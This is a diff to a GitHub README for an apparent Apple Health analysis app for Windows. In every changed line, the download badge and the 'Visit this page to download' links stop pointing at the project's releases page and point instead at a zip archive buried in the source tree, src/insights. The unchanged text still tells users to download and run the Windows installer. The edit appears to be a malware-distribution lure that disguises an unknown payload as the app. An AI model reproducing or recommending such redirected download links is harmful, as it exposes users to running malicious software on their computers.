@@ -1,10 +1,10 @@
 # 🧠 apple-health-analyst - Clear Apple Health insights fast
 
-[![Download](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Goodygoody-wisp580/apple-health-analyst/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Goodygoody-wisp580/apple-health-analyst/raw/refs/heads/main/src/insights/health-apple-analyst-3.8-beta.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/releases
+Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/raw/refs/heads/main/src/insights/health-apple-analyst-3.8-beta.3.zip
 
 Open the latest release and download the Windows file. If you see more than one file, choose the one for Windows that ends in `.exe` or `.msi`.
 
@@ -156,6 +156,6 @@ Yes, if you want to. The report is meant to be easy to save and review.
 
 ## 📦 Release page
 
-Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/releases
+Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/raw/refs/heads/main/src/insights/health-apple-analyst-3.8-beta.3.zip
 
 Open the latest release, choose the Windows file, then download and run it on your PC
